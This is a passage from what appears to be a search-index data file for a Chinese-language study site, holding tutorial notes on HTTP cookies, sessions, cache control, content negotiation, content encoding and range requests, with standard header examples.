API\uFF08\u672C\u5730\u5B58\u50A8\u548C\u4F1A\u8BDD\u5B58\u50A8\uFF09\u6216 IndexedDB\u3002`},{header:"1. \u7528\u9014",slug:"_1-\u7528\u9014",content:`\u4F1A\u8BDD\u72B6\u6001\u7BA1\u7406\uFF08\u5982\u7528\u6237\u767B\u5F55\u72B6\u6001\u3001\u8D2D\u7269\u8F66\u3001\u6E38\u620F\u5206\u6570\u6216\u5176\u5B83\u9700\u8981\u8BB0\u5F55\u7684\u4FE1\u606F\uFF09
\u4E2A\u6027\u5316\u8BBE\u7F6E\uFF08\u5982\u7528\u6237\u81EA\u5B9A\u4E49\u8BBE\u7F6E\u3001\u4E3B\u9898\u7B49\uFF09
\u6D4F\u89C8\u5668\u884C\u4E3A\u8DDF\u8E2A\uFF08\u5982\u8DDF\u8E2A\u5206\u6790\u7528\u6237\u884C\u4E3A\u7B49\uFF09`},{header:"2. \u521B\u5EFA\u8FC7\u7A0B",slug:"_2-\u521B\u5EFA\u8FC7\u7A0B",content:`\u670D\u52A1\u5668\u53D1\u9001\u7684\u54CD\u5E94\u62A5\u6587\u5305\u542B Set-Cookie \u9996\u90E8\u5B57\u6BB5\uFF0C\u5BA2\u6237\u7AEF\u5F97\u5230\u54CD\u5E94\u62A5\u6587\u540E\u628A Cookie \u5185\u5BB9\u4FDD\u5B58\u5230\u6D4F\u89C8\u5668\u4E2D\u3002
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry [page content]
\u5BA2\u6237\u7AEF\u4E4B\u540E\u5BF9\u540C\u4E00\u4E2A\u670D\u52A1\u5668\u53D1\u9001\u8BF7\u6C42\u65F6\uFF0C\u4F1A\u4ECE\u6D4F\u89C8\u5668\u4E2D\u53D6\u51FA Cookie \u4FE1\u606F\u5E76\u901A\u8FC7 Cookie \u8BF7\u6C42\u9996\u90E8\u5B57\u6BB5\u53D1\u9001\u7ED9\u670D\u52A1\u5668\u3002
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry`},{header:"3. \u5206\u7C7B",slug:"_3-\u5206\u7C7B",content:`\u4F1A\u8BDD\u671F Cookie\uFF1A\u6D4F\u89C8\u5668\u5173\u95ED\u4E4B\u540E\u5B83\u4F1A\u88AB\u81EA\u52A8\u5220\u9664\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5B83\u4EC5\u5728\u4F1A\u8BDD\u671F\u5185\u6709\u6548\u3002
\u6301\u4E45\u6027 Cookie\uFF1A\u6307\u5B9A\u8FC7\u671F\u65F6\u95F4\uFF08Expires\uFF09\u6216\u6709\u6548\u671F\uFF08max-age\uFF09\u4E4B\u540E\u5C31\u6210\u4E3A\u4E86\u6301\u4E45\u6027\u7684 Cookie\u3002 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`},{header:"4. \u4F5C\u7528\u57DF",slug:"_4-\u4F5C\u7528\u57DF",content:`Domain \u6807\u8BC6\u6307\u5B9A\u4E86\u54EA\u4E9B\u4E3B\u673A\u53EF\u4EE5\u63A5\u53D7 Cookie\u3002\u5982\u679C\u4E0D\u6307\u5B9A\uFF0C\u9ED8\u8BA4\u4E3A\u5F53\u524D\u6587\u6863\u7684\u4E3B\u673A\uFF08\u4E0D\u5305\u542B\u5B50\u57DF\u540D\uFF09\u3002\u5982\u679C\u6307\u5B9A\u4E86 Domain\uFF0C\u5219\u4E00\u822C\u5305\u542B\u5B50\u57DF\u540D\u3002\u4F8B\u5982\uFF0C\u5982\u679C\u8BBE\u7F6E Domain=mozilla.org\uFF0C\u5219 Cookie \u4E5F\u5305\u542B\u5728\u5B50\u57DF\u540D\u4E2D\uFF08\u5982 developer.mozilla.org\uFF09\u3002
Path \u6807\u8BC6\u6307\u5B9A\u4E86\u4E3B\u673A\u4E0B\u7684\u54EA\u4E9B\u8DEF\u5F84\u53EF\u4EE5\u63A5\u53D7 Cookie\uFF08\u8BE5 URL \u8DEF\u5F84\u5FC5\u987B\u5B58\u5728\u4E8E\u8BF7\u6C42 URL \u4E2D\uFF09\u3002\u4EE5\u5B57\u7B26 %x2F ("/") \u4F5C\u4E3A\u8DEF\u5F84\u5206\u9694\u7B26\uFF0C\u5B50\u8DEF\u5F84\u4E5F\u4F1A\u88AB\u5339\u914D\u3002\u4F8B\u5982\uFF0C\u8BBE\u7F6E Path=/docs\uFF0C\u5219\u4EE5\u4E0B\u5730\u5740\u90FD\u4F1A\u5339\u914D\uFF1A /docs
/docs/Web/
/docs/Web/HTTP`},{header:"5. JavaScript",slug:"_5-javascript",content:`\u6D4F\u89C8\u5668\u901A\u8FC7 document.cookie \u5C5E\u6027\u53EF\u521B\u5EFA\u65B0\u7684 Cookie\uFF0C\u4E5F\u53EF\u901A\u8FC7\u8BE5\u5C5E\u6027\u8BBF\u95EE\u975E HttpOnly \u6807\u8BB0\u7684 Cookie\u3002
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);`},{header:"6. HttpOnly",slug:"_6-httponly",content:`\u6807\u8BB0\u4E3A HttpOnly \u7684 Cookie \u4E0D\u80FD\u88AB JavaScript \u811A\u672C\u8C03\u7528\u3002\u8DE8\u7AD9\u811A\u672C\u653B\u51FB (XSS) \u5E38\u5E38\u4F7F\u7528 JavaScript \u7684 document.cookie API \u7A83\u53D6\u7528\u6237\u7684 Cookie \u4FE1\u606F\uFF0C\u56E0\u6B64\u4F7F\u7528 HttpOnly \u6807\u8BB0\u53EF\u4EE5\u5728\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u907F\u514D XSS \u653B\u51FB\u3002
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly`},{header:"7. Secure",slug:"_7-secure",content:"\u6807\u8BB0\u4E3A Secure \u7684 Cookie \u53EA\u80FD\u901A\u8FC7\u88AB HTTPS \u534F\u8BAE\u52A0\u5BC6\u8FC7\u7684\u8BF7\u6C42\u53D1\u9001\u7ED9\u670D\u52A1\u7AEF\u3002\u4F46\u5373\u4FBF\u8BBE\u7F6E\u4E86 Secure \u6807\u8BB0\uFF0C\u654F\u611F\u4FE1\u606F\u4E5F\u4E0D\u5E94\u8BE5\u901A\u8FC7 Cookie \u4F20\u8F93\uFF0C\u56E0\u4E3A Cookie \u6709\u5176\u56FA\u6709\u7684\u4E0D\u5B89\u5168\u6027\uFF0CSecure \u6807\u8BB0\u4E5F\u65E0\u6CD5\u63D0\u4F9B\u786E\u5B9E\u7684\u5B89\u5168\u4FDD\u969C\u3002"},{header:"8. Session",slug:"_8-session",content:`\u9664\u4E86\u53EF\u4EE5\u5C06\u7528\u6237\u4FE1\u606F\u901A\u8FC7 Cookie \u5B58\u50A8\u5728\u7528\u6237\u6D4F\u89C8\u5668\u4E2D\uFF0C\u4E5F\u53EF\u4EE5\u5229\u7528 Session \u5B58\u50A8\u5728\u670D\u52A1\u5668\u7AEF\uFF0C\u5B58\u50A8\u5728\u670D\u52A1\u5668\u7AEF\u7684\u4FE1\u606F\u66F4\u52A0\u5B89\u5168\u3002
Session \u53EF\u4EE5\u5B58\u50A8\u5728\u670D\u52A1\u5668\u4E0A\u7684\u6587\u4EF6\u3001\u6570\u636E\u5E93\u6216\u8005\u5185\u5B58\u4E2D\u3002\u4E5F\u53EF\u4EE5\u5C06 Session \u5B58\u50A8\u5728 Redis \u8FD9\u79CD\u5185\u5B58\u578B\u6570\u636E\u5E93\u4E2D\uFF0C\u6548\u7387\u4F1A\u66F4\u9AD8\u3002
\u4F7F\u7528 Session \u7EF4\u62A4\u7528\u6237\u767B\u5F55\u72B6\u6001\u7684\u8FC7\u7A0B\u5982\u4E0B\uFF1A \u7528\u6237\u8FDB\u884C\u767B\u5F55\u65F6\uFF0C\u7528\u6237\u63D0\u4EA4\u5305\u542B\u7528\u6237\u540D\u548C\u5BC6\u7801\u7684\u8868\u5355\uFF0C\u653E\u5165 HTTP \u8BF7\u6C42\u62A5\u6587\u4E2D\uFF1B
\u670D\u52A1\u5668\u9A8C\u8BC1\u8BE5\u7528\u6237\u540D\u548C\u5BC6\u7801\uFF0C\u5982\u679C\u6B63\u786E\u5219\u628A\u7528\u6237\u4FE1\u606F\u5B58\u50A8\u5230 Redis \u4E2D\uFF0C\u5B83\u5728 Redis \u4E2D\u7684 Key \u79F0\u4E3A Session ID\uFF1B
\u670D\u52A1\u5668\u8FD4\u56DE\u7684\u54CD\u5E94\u62A5\u6587\u7684 Set-Cookie \u9996\u90E8\u5B57\u6BB5\u5305\u542B\u4E86\u8FD9\u4E2A Session ID\uFF0C\u5BA2\u6237\u7AEF\u6536\u5230\u54CD\u5E94\u62A5\u6587\u4E4B\u540E\u5C06\u8BE5 Cookie \u503C\u5B58\u5165\u6D4F\u89C8\u5668\u4E2D\uFF1B
\u5BA2\u6237\u7AEF\u4E4B\u540E\u5BF9\u540C\u4E00\u4E2A\u670D\u52A1\u5668\u8FDB\u884C\u8BF7\u6C42\u65F6\u4F1A\u5305\u542B\u8BE5 Cookie \u503C\uFF0C\u670D\u52A1\u5668\u6536\u5230\u4E4B\u540E\u63D0\u53D6\u51FA Session ID\uFF0C\u4ECE Redis \u4E2D\u53D6\u51FA\u7528\u6237\u4FE1\u606F\uFF0C\u7EE7\u7EED\u4E4B\u524D\u7684\u4E1A\u52A1\u64CD\u4F5C\u3002 \u5E94\u8BE5\u6CE8\u610F Session ID \u7684\u5B89\u5168\u6027\u95EE\u9898\uFF0C\u4E0D\u80FD\u8BA9\u5B83\u88AB\u6076\u610F\u653B\u51FB\u8005\u8F7B\u6613\u83B7\u53D6\uFF0C\u90A3\u4E48\u5C31\u4E0D\u80FD\u4EA7\u751F\u4E00\u4E2A\u5BB9\u6613\u88AB\u731C\u5230\u7684 Session ID \u503C\u3002\u6B64\u5916\uFF0C\u8FD8\u9700\u8981\u7ECF\u5E38\u91CD\u65B0\u751F\u6210 Session ID\u3002\u5728\u5BF9\u5B89\u5168\u6027\u8981\u6C42\u6781\u9AD8\u7684\u573A\u666F\u4E0B\uFF0C\u4F8B\u5982\u8F6C\u8D26\u7B49\u64CD\u4F5C\uFF0C\u9664\u4E86\u4F7F\u7528 Session \u7BA1\u7406\u7528\u6237\u72B6\u6001\u4E4B\u5916\uFF0C\u8FD8\u9700\u8981\u5BF9\u7528\u6237\u8FDB\u884C\u91CD\u65B0\u9A8C\u8BC1\uFF0C\u6BD4\u5982\u91CD\u65B0\u8F93\u5165\u5BC6\u7801\uFF0C\u6216\u8005\u4F7F\u7528\u77ED\u4FE1\u9A8C\u8BC1\u7801\u7B49\u65B9\u5F0F\u3002`},{header:"9. \u6D4F\u89C8\u5668\u7981\u7528 Cookie",slug:"_9-\u6D4F\u89C8\u5668\u7981\u7528-cookie",content:"\u6B64\u65F6\u65E0\u6CD5\u4F7F\u7528 Cookie \u6765\u4FDD\u5B58\u7528\u6237\u4FE1\u606F\uFF0C\u53EA\u80FD\u4F7F\u7528 Session\u3002\u9664\u6B64\u4E4B\u5916\uFF0C\u4E0D\u80FD\u518D\u5C06 Session ID \u5B58\u653E\u5230 Cookie \u4E2D\uFF0C\u800C\u662F\u4F7F\u7528 URL \u91CD\u5199\u6280\u672F\uFF0C\u5C06 Session ID \u4F5C\u4E3A URL \u7684\u53C2\u6570\u8FDB\u884C\u4F20\u9012\u3002"},{header:"10. Cookie \u4E0E Session \u9009\u62E9",slug:"_10-cookie-\u4E0E-session-\u9009\u62E9",content:`Cookie \u53EA\u80FD\u5B58\u50A8 ASCII \u7801\u5B57\u7B26\u4E32\uFF0C\u800C Session \u5219\u53EF\u4EE5\u5B58\u50A8\u4EFB\u4F55\u7C7B\u578B\u7684\u6570\u636E\uFF0C\u56E0\u6B64\u5728\u8003\u8651\u6570\u636E\u590D\u6742\u6027\u65F6\u9996\u9009 Session\uFF1B
Cookie \u5B58\u50A8\u5728\u6D4F\u89C8\u5668\u4E2D\uFF0C\u5BB9\u6613\u88AB\u6076\u610F\u67E5\u770B\u3002\u5982\u679C\u975E\u8981\u5C06\u4E00\u4E9B\u9690\u79C1\u6570\u636E\u5B58\u5728 Cookie \u4E2D\uFF0C\u53EF\u4EE5\u5C06 Cookie \u503C\u8FDB\u884C\u52A0\u5BC6\uFF0C\u7136\u540E\u5728\u670D\u52A1\u5668\u8FDB\u884C\u89E3\u5BC6\uFF1B
\u5BF9\u4E8E\u5927\u578B\u7F51\u7AD9\uFF0C\u5982\u679C\u7528\u6237\u6240\u6709\u7684\u4FE1\u606F\u90FD\u5B58\u50A8\u5728 Session \u4E2D\uFF0C\u90A3\u4E48\u5F00\u9500\u662F\u975E\u5E38\u5927\u7684\uFF0C\u56E0\u6B64\u4E0D\u5EFA\u8BAE\u5C06\u6240\u6709\u7684\u7528\u6237\u4FE1\u606F\u90FD\u5B58\u50A8\u5230 Session \u4E2D\u3002`},{header:"\u7F13\u5B58",slug:"\u7F13\u5B58",content:""},{header:"1. \u4F18\u70B9",slug:"_1-\u4F18\u70B9",content:`\u7F13\u89E3\u670D\u52A1\u5668\u538B\u529B\uFF1B
\u964D\u4F4E\u5BA2\u6237\u7AEF\u83B7\u53D6\u8D44\u6E90\u7684\u5EF6\u8FDF\uFF1A\u7F13\u5B58\u901A\u5E38\u4F4D\u4E8E\u5185\u5B58\u4E2D\uFF0C\u8BFB\u53D6\u7F13\u5B58\u7684\u901F\u5EA6\u66F4\u5FEB\u3002\u5E76\u4E14\u7F13\u5B58\u670D\u52A1\u5668\u5728\u5730\u7406\u4F4D\u7F6E\u4E0A\u4E5F\u6709\u53EF\u80FD\u6BD4\u6E90\u670D\u52A1\u5668\u6765\u5F97\u8FD1\uFF0C\u4F8B\u5982\u6D4F\u89C8\u5668\u7F13\u5B58\u3002`},{header:"2. \u5B9E\u73B0\u65B9\u6CD5",slug:"_2-\u5B9E\u73B0\u65B9\u6CD5",content:`\u8BA9\u4EE3\u7406\u670D\u52A1\u5668\u8FDB\u884C\u7F13\u5B58\uFF1B
\u8BA9\u5BA2\u6237\u7AEF\u6D4F\u89C8\u5668\u8FDB\u884C\u7F13\u5B58\u3002`},{header:"3. Cache-Control",slug:"_3-cache-control",content:`HTTP/1.1 \u901A\u8FC7 Cache-Control \u9996\u90E8\u5B57\u6BB5\u6765\u63A7\u5236\u7F13\u5B58\u3002
3.1 \u7981\u6B62\u8FDB\u884C\u7F13\u5B58
no-store \u6307\u4EE4\u89C4\u5B9A\u4E0D\u80FD\u5BF9\u8BF7\u6C42\u6216\u54CD\u5E94\u7684\u4EFB\u4F55\u4E00\u90E8\u5206\u8FDB\u884C\u7F13\u5B58\u3002
Cache-Control: no-store
3.2 \u5F3A\u5236\u786E\u8BA4\u7F13\u5B58
no-cache \u6307\u4EE4\u89C4\u5B9A\u7F13\u5B58\u670D\u52A1\u5668\u9700\u8981\u5148\u5411\u6E90\u670D\u52A1\u5668\u9A8C\u8BC1\u7F13\u5B58\u8D44\u6E90\u7684\u6709\u6548\u6027\uFF0C\u53EA\u6709\u5F53\u7F13\u5B58\u8D44\u6E90\u6709\u6548\u65F6\u624D\u80FD\u4F7F\u7528\u8BE5\u7F13\u5B58\u5BF9\u5BA2\u6237\u7AEF\u7684\u8BF7\u6C42\u8FDB\u884C\u54CD\u5E94\u3002
Cache-Control: no-cache
3.3 \u79C1\u6709\u7F13\u5B58\u548C\u516C\u5171\u7F13\u5B58
private \u6307\u4EE4\u89C4\u5B9A\u4E86\u5C06\u8D44\u6E90\u4F5C\u4E3A\u79C1\u6709\u7F13\u5B58\uFF0C\u53EA\u80FD\u88AB\u5355\u72EC\u7528\u6237\u4F7F\u7528\uFF0C\u4E00\u822C\u5B58\u50A8\u5728\u7528\u6237\u6D4F\u89C8\u5668\u4E2D\u3002
Cache-Control: private
public \u6307\u4EE4\u89C4\u5B9A\u4E86\u5C06\u8D44\u6E90\u4F5C\u4E3A\u516C\u5171\u7F13\u5B58\uFF0C\u53EF\u4EE5\u88AB\u591A\u4E2A\u7528\u6237\u4F7F\u7528\uFF0C\u4E00\u822C\u5B58\u50A8\u5728\u4EE3\u7406\u670D\u52A1\u5668\u4E2D\u3002
Cache-Control: public
3.4 \u7F13\u5B58\u8FC7\u671F\u673A\u5236
max-age \u6307\u4EE4\u51FA\u73B0\u5728\u8BF7\u6C42\u62A5\u6587\uFF0C\u5E76\u4E14\u7F13\u5B58\u8D44\u6E90\u7684\u7F13\u5B58\u65F6\u95F4\u5C0F\u4E8E\u8BE5\u6307\u4EE4\u6307\u5B9A\u7684\u65F6\u95F4\uFF0C\u90A3\u4E48\u5C31\u80FD\u63A5\u53D7\u8BE5\u7F13\u5B58\u3002
max-age \u6307\u4EE4\u51FA\u73B0\u5728\u54CD\u5E94\u62A5\u6587\uFF0C\u8868\u793A\u7F13\u5B58\u8D44\u6E90\u5728\u7F13\u5B58\u670D\u52A1\u5668\u4E2D\u4FDD\u5B58\u7684\u65F6\u95F4\u3002
Cache-Control: max-age=31536000
Expires \u9996\u90E8\u5B57\u6BB5\u4E5F\u53EF\u4EE5\u7528\u4E8E\u544A\u77E5\u7F13\u5B58\u670D\u52A1\u5668\u8BE5\u8D44\u6E90\u4EC0\u4E48\u65F6\u5019\u4F1A\u8FC7\u671F\u3002
Expires: Wed, 04 Jul 2012 08:26:05 GMT \u5728 HTTP/1.1 \u4E2D\uFF0C\u4F1A\u4F18\u5148\u5904\u7406 max-age \u6307\u4EE4\uFF1B
\u5728 HTTP/1.0 \u4E2D\uFF0Cmax-age \u6307\u4EE4\u4F1A\u88AB\u5FFD\u7565\u6389\u3002`},{header:"4. \u7F13\u5B58\u9A8C\u8BC1",slug:"_4-\u7F13\u5B58\u9A8C\u8BC1",content:`\u9700\u8981\u5148\u4E86\u89E3 ETag \u9996\u90E8\u5B57\u6BB5\u7684\u542B\u4E49\uFF0C\u5B83\u662F\u8D44\u6E90\u7684\u552F\u4E00\u6807\u8BC6\u3002URL \u4E0D\u80FD\u552F\u4E00\u8868\u793A\u8D44\u6E90\uFF0C\u4F8B\u5982 http://www.google.com/ \u6709\u4E2D\u6587\u548C\u82F1\u6587\u4E24\u4E2A\u8D44\u6E90\uFF0C\u53EA\u6709 ETag \u624D\u80FD\u5BF9\u8FD9\u4E24\u4E2A\u8D44\u6E90\u8FDB\u884C\u552F\u4E00\u6807\u8BC6\u3002
ETag: "82e22293907ce725faf67773957acd12"
\u53EF\u4EE5\u5C06\u7F13\u5B58\u8D44\u6E90\u7684 ETag \u503C\u653E\u5165 If-None-Match \u9996\u90E8\uFF0C\u670D\u52A1\u5668\u6536\u5230\u8BE5\u8BF7\u6C42\u540E\uFF0C\u5224\u65AD\u7F13\u5B58\u8D44\u6E90\u7684 ETag \u503C\u548C\u8D44\u6E90\u7684\u6700\u65B0 ETag \u503C\u662F\u5426\u4E00\u81F4\uFF0C\u5982\u679C\u4E00\u81F4\u5219\u8868\u793A\u7F13\u5B58\u8D44\u6E90\u6709\u6548\uFF0C\u8FD4\u56DE 304 Not Modified\u3002
If-None-Match: "82e22293907ce725faf67773957acd12"
Last-Modified \u9996\u90E8\u5B57\u6BB5\u4E5F\u53EF\u4EE5\u7528\u4E8E\u7F13\u5B58\u9A8C\u8BC1\uFF0C\u5B83\u5305\u542B\u5728\u6E90\u670D\u52A1\u5668\u53D1\u9001\u7684\u54CD\u5E94\u62A5\u6587\u4E2D\uFF0C\u6307\u793A\u6E90\u670D\u52A1\u5668\u5BF9\u8D44\u6E90\u7684\u6700\u540E\u4FEE\u6539\u65F6\u95F4\u3002\u4F46\u662F\u5B83\u662F\u4E00\u79CD\u5F31\u6821\u9A8C\u5668\uFF0C\u56E0\u4E3A\u53EA\u80FD\u7CBE\u786E\u5230\u4E00\u79D2\uFF0C\u6240\u4EE5\u5B83\u901A\u5E38\u4F5C\u4E3A ETag \u7684\u5907\u7528\u65B9\u6848\u3002\u5982\u679C\u54CD\u5E94\u9996\u90E8\u5B57\u6BB5\u91CC\u542B\u6709\u8FD9\u4E2A\u4FE1\u606F\uFF0C\u5BA2\u6237\u7AEF\u53EF\u4EE5\u5728\u540E\u7EED\u7684\u8BF7\u6C42\u4E2D\u5E26\u4E0A If-Modified-Since \u6765\u9A8C\u8BC1\u7F13\u5B58\u3002\u670D\u52A1\u5668\u53EA\u5728\u6240\u8BF7\u6C42\u7684\u8D44\u6E90\u5728\u7ED9\u5B9A\u7684\u65E5\u671F\u65F6\u95F4\u4E4B\u540E\u5BF9\u5185\u5BB9\u8FDB\u884C\u8FC7\u4FEE\u6539\u7684\u60C5\u51B5\u4E0B\u624D\u4F1A\u5C06\u8D44\u6E90\u8FD4\u56DE\uFF0C\u72B6\u6001\u7801\u4E3A 200 OK\u3002\u5982\u679C\u8BF7\u6C42\u7684\u8D44\u6E90\u4ECE\u90A3\u65F6\u8D77\u672A\u7ECF\u4FEE\u6539\uFF0C\u90A3\u4E48\u8FD4\u56DE\u4E00\u4E2A\u4E0D\u5E26\u6709\u5B9E\u4F53\u4E3B\u4F53\u7684 304 Not Modified \u54CD\u5E94\u62A5\u6587\u3002
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT`},{header:"\u5185\u5BB9\u534F\u5546",slug:"\u5185\u5BB9\u534F\u5546",content:"\u901A\u8FC7\u5185\u5BB9\u534F\u5546\u8FD4\u56DE\u6700\u5408\u9002\u7684\u5185\u5BB9\uFF0C\u4F8B\u5982\u6839\u636E\u6D4F\u89C8\u5668\u7684\u9ED8\u8BA4\u8BED\u8A00\u9009\u62E9\u8FD4\u56DE\u4E2D\u6587\u754C\u9762\u8FD8\u662F\u82F1\u6587\u754C\u9762\u3002"},{header:"1. \u7C7B\u578B",slug:"_1-\u7C7B\u578B",content:`1.1 \u670D\u52A1\u7AEF\u9A71\u52A8\u578B
\u5BA2\u6237\u7AEF\u8BBE\u7F6E\u7279\u5B9A\u7684 HTTP \u9996\u90E8\u5B57\u6BB5\uFF0C\u4F8B\u5982 Accept\u3001Accept-Charset\u3001Accept-Encoding\u3001Accept-Language\uFF0C\u670D\u52A1\u5668\u6839\u636E\u8FD9\u4E9B\u5B57\u6BB5\u8FD4\u56DE\u7279\u5B9A\u7684\u8D44\u6E90\u3002
\u5B83\u5B58\u5728\u4EE5\u4E0B\u95EE\u9898\uFF1A \u670D\u52A1\u5668\u5F88\u96BE\u77E5\u9053\u5BA2\u6237\u7AEF\u6D4F\u89C8\u5668\u7684\u5168\u90E8\u4FE1\u606F\uFF1B
\u5BA2\u6237\u7AEF\u63D0\u4F9B\u7684\u4FE1\u606F\u76F8\u5F53\u5197\u957F\uFF08HTTP/2 \u534F\u8BAE\u7684\u9996\u90E8\u538B\u7F29\u673A\u5236\u7F13\u89E3\u4E86\u8FD9\u4E2A\u95EE\u9898\uFF09\uFF0C\u5E76\u4E14\u5B58\u5728\u9690\u79C1\u98CE\u9669\uFF08HTTP \u6307\u7EB9\u8BC6\u522B\u6280\u672F\uFF09\uFF1B
\u7ED9\u5B9A\u7684\u8D44\u6E90\u9700\u8981\u8FD4\u56DE\u4E0D\u540C\u7684\u5C55\u73B0\u5F62\u5F0F\uFF0C\u5171\u4EAB\u7F13\u5B58\u7684\u6548\u7387\u4F1A\u964D\u4F4E\uFF0C\u800C\u670D\u52A1\u5668\u7AEF\u7684\u5B9E\u73B0\u4F1A\u8D8A\u6765\u8D8A\u590D\u6742\u3002 1.2 \u4EE3\u7406\u9A71\u52A8\u578B
\u670D\u52A1\u5668\u8FD4\u56DE 300 Multiple Choices \u6216\u8005 406 Not Acceptable\uFF0C\u5BA2\u6237\u7AEF\u4ECE\u4E2D\u9009\u51FA\u6700\u5408\u9002\u7684\u90A3\u4E2A\u8D44\u6E90\u3002`},{header:"2. Vary",slug:"_2-vary",content:`Vary: Accept-Language
\u5728\u4F7F\u7528\u5185\u5BB9\u534F\u5546\u7684\u60C5\u51B5\u4E0B\uFF0C\u53EA\u6709\u5F53\u7F13\u5B58\u670D\u52A1\u5668\u4E2D\u7684\u7F13\u5B58\u6EE1\u8DB3\u5185\u5BB9\u534F\u5546\u6761\u4EF6\u65F6\uFF0C\u624D\u80FD\u4F7F\u7528\u8BE5\u7F13\u5B58\uFF0C\u5426\u5219\u5E94\u8BE5\u5411\u6E90\u670D\u52A1\u5668\u8BF7\u6C42\u8BE5\u8D44\u6E90\u3002
\u4F8B\u5982\uFF0C\u4E00\u4E2A\u5BA2\u6237\u7AEF\u53D1\u9001\u4E86\u4E00\u4E2A\u5305\u542B Accept-Language \u9996\u90E8\u5B57\u6BB5\u7684\u8BF7\u6C42\u4E4B\u540E\uFF0C\u6E90\u670D\u52A1\u5668\u8FD4\u56DE\u7684\u54CD\u5E94\u5305\u542B Vary: Accept-Language \u5185\u5BB9\uFF0C\u7F13\u5B58\u670D\u52A1\u5668\u5BF9\u8FD9\u4E2A\u54CD\u5E94\u8FDB\u884C\u7F13\u5B58\u4E4B\u540E\uFF0C\u5728\u5BA2\u6237\u7AEF\u4E0B\u4E00\u6B21\u8BBF\u95EE\u540C\u4E00\u4E2A URL \u8D44\u6E90\uFF0C\u5E76\u4E14 Accept-Language \u4E0E\u7F13\u5B58\u4E2D\u7684\u5BF9\u5E94\u7684\u503C\u76F8\u540C\u65F6\u624D\u4F1A\u8FD4\u56DE\u8BE5\u7F13\u5B58\u3002`},{header:"\u5185\u5BB9\u7F16\u7801",slug:"\u5185\u5BB9\u7F16\u7801",content:`\u5185\u5BB9\u7F16\u7801\u5C06\u5B9E\u4F53\u4E3B\u4F53\u8FDB\u884C\u538B\u7F29\uFF0C\u4ECE\u800C\u51CF\u5C11\u4F20\u8F93\u7684\u6570\u636E\u91CF\u3002
\u5E38\u7528\u7684\u5185\u5BB9\u7F16\u7801\u6709\uFF1Agzip\u3001compress\u3001deflate\u3001identity\u3002
\u6D4F\u89C8\u5668\u53D1\u9001 Accept-Encoding \u9996\u90E8\uFF0C\u5176\u4E2D\u5305\u542B\u6709\u5B83\u6240\u652F\u6301\u7684\u538B\u7F29\u7B97\u6CD5\uFF0C\u4EE5\u53CA\u5404\u81EA\u7684\u4F18\u5148\u7EA7\u3002\u670D\u52A1\u5668\u5219\u4ECE\u4E2D\u9009\u62E9\u4E00\u79CD\uFF0C\u4F7F\u7528\u8BE5\u7B97\u6CD5\u5BF9\u54CD\u5E94\u7684\u6D88\u606F\u4E3B\u4F53\u8FDB\u884C\u538B\u7F29\uFF0C\u5E76\u4E14\u53D1\u9001 Content-Encoding \u9996\u90E8\u6765\u544A\u77E5\u6D4F\u89C8\u5668\u5B83\u9009\u62E9\u4E86\u54EA\u4E00\u79CD\u7B97\u6CD5\u3002\u7531\u4E8E\u8BE5\u5185\u5BB9\u534F\u5546\u8FC7\u7A0B\u662F\u57FA\u4E8E\u7F16\u7801\u7C7B\u578B\u6765\u9009\u62E9\u8D44\u6E90\u7684\u5C55\u73B0\u5F62\u5F0F\u7684\uFF0C\u54CD\u5E94\u62A5\u6587\u7684 Vary \u9996\u90E8\u5B57\u6BB5\u81F3\u5C11\u8981\u5305\u542B Content-Encoding\u3002`},{header:"\u8303\u56F4\u8BF7\u6C42",slug:"\u8303\u56F4\u8BF7\u6C42",content:"\u5982\u679C\u7F51\u7EDC\u51FA\u73B0\u4E2D\u65AD\uFF0C\u670D\u52A1\u5668\u53EA\u53D1\u9001\u4E86\u4E00\u90E8\u5206\u6570\u636E\uFF0C\u8303\u56F4\u8BF7\u6C42\u53EF\u4EE5\u4F7F\u5F97\u5BA2\u6237\u7AEF\u53EA\u8BF7\u6C42\u670D\u52A1\u5668\u672A\u53D1\u9001\u7684\u90A3\u90E8\u5206\u6570\u636E\uFF0C\u4ECE\u800C\u907F\u514D\u670D\u52A1\u5668\u91CD\u65B0\u53D1\u9001\u6240\u6709\u6570\u636E\u3002"},{header:"1. Range",slug:"_1-range",content:`\u5728\u8BF7\u6C42\u62A5\u6587\u4E2D\u6DFB\u52A0 Range \u9996\u90E8\u5B57\u6BB5\u6307\u5B9A\u8BF7\u6C42\u7684\u8303\u56F4\u3002
GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
\u8BF7\u6C42\u6210\u529F\u7684\u8BDD\u670D\u52A1\u5668\u8FD4\u56DE\u7684\u54CD\u5E94\u5305\u542B 206 Partial Content \u72B6\u6001\u7801\u3002
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)`},{header:"2. Accept-Ranges",slug:"_2-accept-ranges",content:`\u54CD\u5E94\u9996\u90E8\u5B57\u6BB5 Accept-Ranges \u7528\u4E8E\u544A\u77E5\u5BA2\u6237\u7AEF\u662F\u5426\u80FD\u5904\u7406\u8303\u56F4\u8BF7\u6C42\uFF0C\u53EF\u4EE5\u5904\u7406\u4F7F\u7528 bytes\uFF0C\u5426\u5219\u4F7F\u7528 none\u3002
Accept-Ranges: bytes`},{header:"3. \u54CD\u5E94\u72B6\u6001\u7801",slug:"_3-\u54CD\u5E94\u72B6\u6001\u7801",content:`\u5728\u8BF7\u6C42\u6210\u529F\u7684\u60C5\u51B5\u4E0B\uFF0C\u670D\u52A1\u5668\u4F1A\u8FD4\u56DE 206 Partial Content \u72B6\u6001\u7801\u3002
\u5728\u8BF7\u6C42\u7684\u8303\u56F4\u8D8A\u754C\u7684\u60C5\u51B5\u4E0B\uFF0C\u670D\u52A1\u5668\u4F1A\u8FD4\u56DE 416 Requested Range Not Satisfiable \u72B6\u6001\u7801\u3002
